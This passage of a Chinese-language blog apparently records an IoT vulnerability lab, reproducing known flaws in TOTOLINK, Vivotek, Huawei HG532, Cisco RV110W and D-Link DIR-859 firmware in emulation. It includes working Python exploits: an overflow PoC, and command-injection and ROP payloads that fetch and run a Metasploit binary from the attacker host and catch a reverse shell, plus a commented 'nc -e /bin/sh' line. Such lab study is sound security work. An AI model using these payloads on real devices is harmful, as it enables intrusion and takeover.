https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta# 2.6.32wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta./download.sh</code></pre><p>服务启动成功！</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902277.png" alt="image-20240623143052731"></p><p>3.开启ssh隧道</p><p>本地使用ssh创建socks代理，然后浏览器配置代理</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">ssh -D 10006 root@124.221.122.67 -p 1234</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903524.png" alt="image-20240623153609456"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903795.png" alt="image-20240623152246628"></p><p>成功访问服务路由</p><p>运行exp.py，打通</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903991.png" alt="image-20240623153513904"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>CVE-2022-41525的成因是cstecgi.cgi的doSystem过滤不严谨，将cstecgi.cgi 传下来进行分析</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902852.png" alt="image-20240623153858761"></p><p>通过dosystem交叉调用寻找漏洞点，</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251904405.png" alt="image-20240623154248447"></p><p>ida不支持mips的反汇编，需要下载Retdec插件，但是有点大了，所以我使用ghidra进行反编译</p><p>&#x2F;cgi-bin&#x2F;cstecgi.cgi 的 UploadFirmwareFile 函数，其参数FileName参数可控，并且将作为doSystem的参数被执行。</p><p>这个命令注入不需要进行绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902945.png" alt="image-20240623164123142"></p><h1 id="Vivotek-CC8160-栈溢出漏洞"><a href="#Vivotek-CC8160-栈溢出漏洞" class="headerlink" title="Vivotek CC8160 栈溢出漏洞"></a>Vivotek CC8160 栈溢出漏洞<a id="VIVOTEK"></a></h1><p><a href="https://xz.aliyun.com/t/5054?time__1311=n4+xnD07iti=j2DBqooGkYd0QeG=Q8DRjoD&alichlgref=https://xz.aliyun.com/t/5054#toc-4">Vivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)</a></p><h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul><li>docker：攻击、调试主机：192.168.2.1</li><li>qemu-system：固件主机：192.168.2.2</li><li>httpd（有漏洞服务）：192.168.2.2:80</li><li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:armel</code></li></ul><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在漏洞路径下  使用 firmianay&#x2F;binwalk 解压固件</p><blockquote><p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.bin”</p></blockquote><h3 id="用户模拟"><a href="#用户模拟" class="headerlink" title="用户模拟"></a>用户模拟</h3><p>构建并启动漏洞环境:</p><blockquote><p>docker-compose -f docker-compose-user.yml build</p></blockquote><p>这里构建环境出现问题缺少firmianay&#x2F;qemu-user-static 镜像文件，docker.io中没有对应的镜像文件，我们需要到~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static里面自行构建</p><blockquote><p>cd ~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static</p><p>docker build -t firmianay&#x2F;qemu-user-static.</p></blockquote><p>然后就能成功在本地构建镜像</p><p>重新构建启动容器，能够成功运行服务</p><blockquote><p>docker-compose -f docker-compose-user.yml build</p><p>docker-compose -f docker-compose-user.yml up</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251859341.png" alt="image-20240625185942262"></p><h3 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h3><p>先自行构建qemu-system镜像</p><pre class=" language-highlight shell"><code class="language-highlight shell">cd ~/iot_hub/IoT-vulhub-master/baseImage/qemu-system/armel/images./download.sh   #记得改链接<span class="meta prompt_"></span><span class="meta prompt_">#</span><span class="language-bash">镜像构建</span>docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .</code></pre><p>如果构建qemu-system时gef拉取不下来就注释掉</p><p> 然后跟着手册走</p><p>输入poc发现系统服务dump了</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251900140.png" alt="image-20240622212015099"></p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>固件解包后查看漏洞文件</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251923337.png" alt="image-20240625192328286"></p><p>漏洞分析：</p><p>漏洞点位于&#x2F;usr&#x2F;sbin&#x2F;httpd中的sub_17F80，由于Content-Length引起的溢出</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251953973.png" alt="image-20240625195352919"></p><p>uVar6是 “Content-Length” 的初始地址</p><p>而iVar3 、4是在字符串中“\n”和“:”首次出现的地址，二者之间也就是输入的消息</p><p>通过strncpy来将iVar4 + 1 (Content-Length_value)的 iVar3 - (iVar4 + 1) 字节(Content-Length_len)数据copy到 &amp;local_38</p><p>程序没有对Content-length字段进行校验，直接将输入的消息赋值给了local_38中，而local_38距离栈底只有0x38字节</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406252002547.png" alt="image-20240625200208487"></p><p>poc</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!usr/bin/python</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">import</span> requestsheader = &#123;<span class="string">"Content-Length"</span>:<span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"</span>&#125;url = <span class="string">"http://192.168.2.2"</span> + <span class="string">"/cgi-bin/admin/upgrade.cgi"</span>session = requests.session()session.post(url, headers=header)</code></pre><h1 id="华为-HG532-远程代码执行漏洞（CVE-2017-17215）"><a href="#华为-HG532-远程代码执行漏洞（CVE-2017-17215）" class="headerlink" title="华为 HG532 远程代码执行漏洞（CVE-2017-17215）"></a>华为 HG532 远程代码执行漏洞（CVE-2017-17215）<a id="HG532"></a></h1><p><a href="https://www.cnblogs.com/L0g4n-blog/p/15613816.html">漏洞分析：CVE-2017-17215 - Riv4ille - 博客园 (cnblogs.com)</a></p><h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul><li>docker：攻击、调试主机：192.168.2.1</li><li>qemu-system：固件主机：192.168.2.2</li><li>uhttpd（有漏洞 Web 服务器）：192.168.2.2:80</li><li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mips</code></li></ul><h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压固件</p><blockquote><p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;HG532eV100R001C01B020_upgrade_packet.bin”</p></blockquote><p>固件分析 32位 mips架构 小端序</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261004016.png" alt="image-20240626100451970"></p><p>剩下步骤与TOTOLINK NR1800X相同，本地构建qemu-system镜像，然后构建漏洞环境，启动环境</p><blockquote><p>#到squashfs-root所在目录</p><p>cp -r .&#x2F;squashfs-root&#x2F; ..&#x2F;</p><p>#改Dockerfile文件目录</p><p>#构建本地qemu-system镜像</p><p>docker build -t firmianay&#x2F;qemu-system:mips .</p><p>docker-compose -f docker-compose-system.yml build</p><p>docker-compose -f docker-compose-system.yml up</p></blockquote><p>使用ssh设置socks 代理后，配置浏览器代理，然后登陆 Web 后台 <a href="http://192.168.2.2/%EF%BC%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8A%A5%E9%94%99">http://192.168.2.2/，服务端报错</a></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260004775.png" alt="image-20240625234908598"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260909274.png" alt="image-20240626090924119"></p><p>本地代理连接测试，成功连接到了192.168.2.2并且重定向到<a href="https://192.168.2.2/">https://192.168.2.2</a></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260912255.png" alt="image-20240626091219207"></p><p>测试https连接</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260914069.png" alt="image-20240626091406016"></p><p>发现是接收到了SSL证书错误，添加-k选项，忽略SSL证书验证</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260916879.png" alt="image-20240626091654813"></p><p>成功访问服务！</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261029907.png" alt="image-20240626094931147"></p><p>照着文档打通了<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260045636.png" alt="image-20240626004523543"></p><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>详细的控制流分析以及UPnP协议的学习有些心有余而力不足了</p><p>简单分析一下upnp里面的关键漏洞代码</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261030685.png" alt="image-20240626101528081"></p><p>这里调用了snprintf(a0, a1, a2, a3)</p><p>即snprintf(a0, 0x400, “upg -g -U %s -t ‘1 Firmware Upgrade Ima”, a3)</p><p>a0源操作数，a1为size，a2为格式化字符，a3为指定格式化的数据</p><p>a0又是snprintf的源操作数，也是system调用的参数，最后会执行system(a0)</p><p>exp:最终执行cmd</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/python3</span><span class="keyword">import</span> requests<span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth<span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> threading <span class="keyword">import</span> Thread<span class="comment"># cmd = "busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 7777 -e /bin/sh"</span>cmd  = <span class="string">&#x27;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\n&#x27;</span>cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>cmd += <span class="string">&#x27;/msf&#x27;</span><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) < <span class="number">255</span>)data = <span class="string">"<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$("</span> + cmd + <span class="string">")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"</span>url = <span class="string">"http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1"</span><span class="keyword">def</span> <span class="title function_">attack</span>():    <span class="keyword">try</span>:        requests.post(url, auth=HTTPDigestAuth(<span class="string">&#x27;dslf-config&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>), data=data)    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:        <span class="built_in">print</span>(e)thread = Thread(target=attack)thread.start()io = listen(<span class="number">31337</span>)io.wait_for_connection()log.success(<span class="string">"getshell"</span>)io.interactive()thread.join()</code></pre><h1 id="Cisco-RV110W-远程代码执行漏洞（CVE-2020-3331）"><a href="#Cisco-RV110W-远程代码执行漏洞（CVE-2020-3331）" class="headerlink" title="Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）"></a>Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）<a id="CISCO"></a></h1><p>难题的复现找来找去只有那么几位师傅</p><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p>[<a href="https://bbs.kanxue.com/thread-271900.htm">原创]Cisco RV110W 远程代码执行漏洞分析(CVE-2020-3331)-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><p>思科无线路由器</p><h2 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul><li>docker：攻击、调试主机：192.168.2.1</li><li>qemu-system：固件主机：192.168.2.2</li><li>httpd（有漏洞 Web 服务器）：192.168.2.2:80</li><li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li></ul><h2 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压固件</p><blockquote><p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;RV110W_FW_1.2.2.5.bin”</p></blockquote><p>构建启动环境</p><blockquote><p>.&#x2F;init_env.sh mipsel</p><p>docker-compose -f docker-compose-system.yml build</p><p>docker-compose -f docker-compose-system.yml up</p></blockquote><p>docker内进行端口转发(Docker-compose.yml中写好了端口映射)</p><blockquote><p>ssh <a href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;">&#114;&#x6f;&#111;&#116;&#x40;&#49;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;</a> -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666</p><p>ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;">&#114;&#111;&#x6f;&#116;&#64;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;</a> -f -N -g -R 0.0.0.0:80:192.168.2.2:80</p></blockquote><p>nmap可以扫到服务  8888–漏洞服务    6666–gdbserver</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262320963.png" alt="image-20240626231935303"></p><p>运行exp，打通</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262355451.png" alt="image-20240626235453453"></p><p>断开后服务会down，需要重新up才能起来</p><p>调试配置</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271159313.png" alt="image-20240627115953109"></p><h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>内置的gef插件无法正常加载–原因为gdb与python版本较低</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270002901.png" alt="image-20240627000252848"></p><p>官方手册</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270004520.png" alt="image-20240627000444482"></p><p>要求GDB 8.0以上，Python3.6+，修改更麻烦了，干脆不装gef了，把gef那行注释掉</p><pre class=" language-highlight Dockerfile"><span class="keyword"><code class="language-highlight Dockerfile"><span class="keyword">FROM</span> firmianay/ubuntu1604                                                                                                                <span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">"firmianay@gmail.com"</span>                                                                                                       </span>                                                                                                                                         <span class="keyword">WORKDIR</span><span class="language-bash"> /root                                                                                                                            </span>                                                                                                                                         <span class="keyword">RUN</span><span class="language-bash"> apt-get update \                                                                                                                     </span>    && apt-get install -y qemu-system-mipsel \                                                                                               && apt-get install -y --no-install-recommends bridge-utils uml-utilities expect gdb-multiarch git python3-dev openssh-server netcat curl libssl-dev libffi-dev build-essential tcpdump \                                                                                          && sed -i <span class="string">"s/PermitRootLogin prohibit-password/PermitRootLogin yes/g"</span> /etc/ssh/sshd_config && echo <span class="string">"root:root"</span> | chpasswd && echo <span class="string">"GatewayPorts yes"</span> >>  /etc/ssh/sshd_config \                                                                                                  <span class="comment"># && git clone --depth=1 https://github.com/hugsy/gef.git \   </span>    && git clone --depth=<span class="number">1</span> https://github.com/longld/peda.git ~/peda \   <span class="comment"># && cp gef/gef.py ~/.gef.py && echo "source ~/.gef.py" > ~/.gdbinit && echo "export LC_CTYPE=C.UTF-8" >> ~/.bashrc \    </span>    && echo <span class="string">"source ~/peda/peda.py"</span> >> ~/.gdbinit && echo <span class="string">"export LC_CTYPE=C.UTF-8"</span> >> ~/.bashrc \     && python3 -m pip install --upgrade pwntools \                                                                                           && apt-get purge -y --autoremove git \                                                                                                   && rm -rf /var/lib/apt/lists/* /root/gef                                                                                                                                                                                                                                      <span class="comment">#RUN mkdir images && cd images \                                                                                                         </span><span class="comment">#    && wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2                                          </span><span class="comment">#    && wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta                                                    </span>                                                                                                                                         <span class="keyword">COPY</span><span class="language-bash"> ./images /root/images</span></code></pre><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本漏洞存在于CISCO RV110W-E-CN-K9（固件版本1.2.2.5），漏洞原因是cgi接口guest_logout.cgi中存在栈溢出漏洞，而因为mips本身不支持NX从而导致可以使用shellcode得到shell </p><p>漏洞点 sscanf函数通过政策表达式将v11输入v29和v28中  其中v29存储的是分号前的所有字符，而v28存储的是不在分号后和等号前但在等号后换行符前的所有字符</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271205845.png" alt="image-20240627120518766"></p><p>然后跟踪v11</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271207669.png" alt="image-20240627120718622"></p><p>exp:</p><p>msf生成的exp</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/python3</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">import</span> requests<span class="keyword">from</span> threading <span class="keyword">import</span> Threadcontext(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)system = <span class="number">0x0047A610</span>cmd  = <span class="string">&#x27;\n&#x27;</span>cmd += <span class="string">&#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\n&#x27;</span>cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>cmd += <span class="string">&#x27;/msf\n&#x27;</span><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) < <span class="number">0x55</span>)payload = <span class="string">b"status_guestnet.asp"</span> + cmd.ljust(<span class="number">0x55</span>,<span class="string">&#x27;a&#x27;</span>).encode() + p32(system) data = &#123;<span class="string">"cmac"</span>:<span class="string">"12:af:aa:bb:cc:dd"</span>, <span class="string">"submit_button"</span>:payload, <span class="string">"cip"</span>:<span class="string">"192.168.100.1"</span>&#125;<span class="keyword">def</span> <span class="title function_">attack</span>():    <span class="keyword">try</span>:        requests.post(<span class="string">"http://192.168.2.2/guest_logout.cgi"</span>, data=data, timeout=<span class="number">1</span>)    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:        <span class="built_in">print</span>(e)thread = Thread(target=attack)thread.start()io = listen(<span class="number">31337</span>)io.wait_for_connection()log.success(<span class="string">"getshell"</span>)io.interactive()thread.join()</code></pre><h1 id="D-Link-DIR-859-命令注入漏洞（CVE-2019-17621）"><a href="#D-Link-DIR-859-命令注入漏洞（CVE-2019-17621）" class="headerlink" title="D-Link DIR-859 命令注入漏洞（CVE-2019-17621）"></a>D-Link DIR-859 命令注入漏洞（CVE-2019-17621）<a id="DLINK"></a></h1><h2 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul><li>docker：攻击、调试主机：192.168.2.1</li><li>firmadyne：固件主机：192.168.0.1</li><li>htdocs&#x2F;cgibin（有漏洞的服务程序）：192.168.0.1:49152</li><li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/binwalk:noentry -&gt; firmianay/firmadyne（或者 firmianay/firmae）</code></li></ul><h2 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>缺少的镜像需要到对应baseimage目录下面构建</p><blockquote><p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.bin”</p><p>docker-compose -f docker-compose-firmadyne.yml build   #docker-compose -f docker-compose-firmae.yml build</p><p>docker-compose -f docker-compose-firmadyne.yml up       #docker-compose -f docker-compose-firmae.yml up</p></blockquote><p>两种方法都尝试了，docker都没起来</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271926418.png" alt="image-20240627192536273"></p><h2 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建<a id="LOCAL"></a></h2><p><a href="https://mp.weixin.qq.com/s/TzFepaBpYnMbZ8Mep4IXwA">D-Link DIR-859 RCE漏洞（CVE-2019-17621）分析复现 (qq.com)</a></p><p><a href="https://www.cnblogs.com/VxerLee/p/16427304.html">零基础学IoT Pwn</a></p><p>本地ubuntu22.04虚拟机搭建IOT环境</p><h3 id="binwalk固件解包工具"><a href="#binwalk固件解包工具" class="headerlink" title="binwalk固件解包工具"></a>binwalk固件解包工具<a id="binwalk"></a></h3><p><a href="https://github.com/ReFirmLabs/binwalk">ReFirmLabs&#x2F;binwalk: Firmware Analysis Tool (github.com)</a></p><pre class=" language-highlight shell"><code class="language-highlight shell">git clone https://github.com/ReFirmLabs/binwalk.git<span class="meta prompt_"></span><span class="meta prompt_">#</span><span class="language-bash">依赖项包含在deps.sh中</span>./.deps.sh<span class="meta prompt_">#</span><span class="language-bash">一些依赖工具</span>sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools sleuthkit default-jdk lzop srecordsudo python3 setup.py install<span class="meta prompt_"></span><span class="meta prompt_">#</span><span class="language-bash">卸载</span>sudo python3 setup.py uninstall</code></pre><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu<a id="qemu"></a></h3><p>没有本地编译，直接用官方的命令行安装</p><p><a href="https://www.qemu.org/download/#linux">Download QEMU - QEMU</a></p><p>Debian&#x2F;Ubuntu:</p><ul><li>For full system emulation: <code>apt-get install qemu-system</code></li><li>For emulating Linux binaries: <code>apt-get install qemu-user-static</code></li></ul><h3 id="Firmadyne-固件仿真工具"><a href="#Firmadyne-固件仿真工具" class="headerlink" title="Firmadyne 固件仿真工具"></a>Firmadyne 固件仿真工具<a id="firmadyne"></a></h3><p><a href="https://github.com/firmadyne/firmadyne#introduction">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p><pre class=" language-highlight shell"><code class="language-highlight shell">git clone --recursive https://github.com/firmadyne/firmadyne.git    #克隆项目以及子项目</code></pre><p>安装postgresql数据库</p><pre class=" language-highlight shell"><code class="language-highlight shell">sudo apt-get install postgresqlsudo -u postgres createuser -P firmadyne  #密码设置为firmadynesudo -u postgres createdb -O firmadyne firmwaresudo -u postgres psql -d firmware < ./firmadyne/database/schema</code></pre><p>检查数据库是否配置完成</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">sudo -u postgres psql -d firmware   #连接到数据库\dt                       #列出所有表\d table_name                 #查看表结构SELECT * FROM table_name;        #查看表中数据\q                       #退出</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913673.png" alt="image-20240717091308539"></p><p>下载需要的二进制工具</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">sudo ./download.shls ./binaries/   #检查安装完成</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913451.png" alt="image-20240717091350377"></p><h3 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件<a id="action"></a></h3><p>清理环境</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">sudo su./reset.py</code></pre><p>提取固件包并保存镜像</p><pre class=" language-highlight shell"><code class="language-highlight shell">./sources/extractor/extractor.py -b Dlink -sql 127.0.0.1 -np -nk DIR822A1_FW103WWb03.bin  images<span class="meta prompt_">#</span><span class="language-bash">-b  指定固件所属品牌</span><span class="meta prompt_">#</span><span class="language-bash">-sql 连接本地数据库</span><span class="meta prompt_">#</span><span class="language-bash">-np 不使用并行模式，这个参数告诉脚本不使用并行处理，通常用于调试或在资源有限的系统上运行时使用</span><span class="meta prompt_">#</span><span class="language-bash">-nk 不保留提取的固件镜像</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170935339.png" alt="image-20240717093500277"></p><p>识别CPU架构</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/getArch.sh ./images/2.tar.gz</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170936295.png" alt="image-20240717093612247"></p><p>创建镜像</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/makeImage.sh id</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171034660.png" alt="image-20240717103423529"></p><p>存储数据库</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/tar2db.py -i id -f ./images/3.tar.gz#数据库查看sudo -u postgres psql -d firmware SELECT * FROM image WHERE id = 3;</code></pre><p>设置网络接口</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/inferNetwork.sh id</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171033321.png" alt="image-20240717103310256"></p><p>然后本地会生成一个同网段的网卡</p><p>运行固件</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scratch/id/run.sh</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171040100.png" alt="image-20240717104031046"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171039126.png" alt="image-20240717103956988"></p><p>ssh端口转发</p><p><a href="https://blog.csdn.net/qingzhantianxia/article/details/121956966">流量转发之端口转发-CSDN博客</a></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171111502.png" alt="屏幕截图 2024-07-17 110805"></p><p>调试环境的搭建先搁着</p><p>用iot-vulhub里面提供的exp打通</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171118223.png" alt="image-20240717111850093"></p><p>服务关闭</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">netstat -lnp  #查看qemu服务PIDkill -9 pid</code></pre><p>模拟固件过程中使用数据库来记录和统计固件信息，有时这一行为是无用功，<a href="https://wzt.ac.cn/2021/08/15/firmadyne3/">固件模拟 Case Study (3) | CataLpa’s Site (wzt.ac.cn)</a>这位师傅是将firmadyne中写入数据库的代码进行了删改</p><p>FAT项目基于Firmadyne进行了更改，不使用PostgreSQL数据库存储设备信息。</p><p>下载 Firmware Analysis Toolkit</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">git clone https://github.com/attify/firmware-analysis-toolkit.git</code></pre><p>改fat.config文件中的配置信息</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">[DEFAULT]sudo_password=Your_Root_pwdfirmadyne_path=Your_firmadyne_Path</code></pre><p>设置的网络接口为空，虽然跑起来了，但是ifconfig没有网卡信息，服务没起起来</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171324298.png" alt="image-20240717132423058"></p><p>inferNetwork.sh没有找到任何网络接口，作者有在论文中提到<a href="https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf">firmadyne&#x2F;paper&#x2F;paper.pdf at master · firmadyne&#x2F;firmadyne (github.com)</a> </p><blockquote><p>一个令人不便的事实是，提高仿真成功率或修复固件映像的网络配置检测，例如 Shibby 的 Tomato，是一个手动过程。</p><p>它要求分析人员手动检查系统日志，以便根据根本原因识别和分类仿真失败，然后进行必要的更改以支持这些映像。</p><p>通常，这可能是一个循环过程，因为仿真失败可能有多种原因。</p></blockquote><p>firmware-analysis-toolkit的作者有在<a href="https://github.com/attify/firmware-analysis-toolkit/issues/46">issuse46</a>里提供了一个方法，将inferNetwork.sh超时值增加</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171410301.png" alt="image-20240717141057141"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://mp.weixin.qq.com/s/TzFepaBpYnMbZ8Mep4IXwA">D-Link DIR-859 RCE漏洞（CVE-2019-17621）分析复现 (qq.com)</a></p><p><a href="https://www.cnblogs.com/m00nflower/p/15933470.html">CVE-2019-17621 Dlink-859 RCE 复现 - moon_flower - 博客园 